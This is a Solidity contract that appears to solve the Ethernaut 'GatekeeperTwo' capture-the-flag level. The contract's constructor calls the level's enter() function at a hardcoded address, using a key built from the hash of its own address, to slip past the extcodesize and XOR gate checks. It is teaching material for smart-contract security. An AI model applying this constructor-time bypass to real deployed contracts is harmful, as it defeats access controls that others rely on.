// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
  constructor() {
    GatekeeperTwo gatekeepertwo = GatekeeperTwo(0x0826223156fF61F9abf620D2f58A06177DA664Cc);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(type(uint64).max));
    gatekeepertwo.enter(key);
  }
}
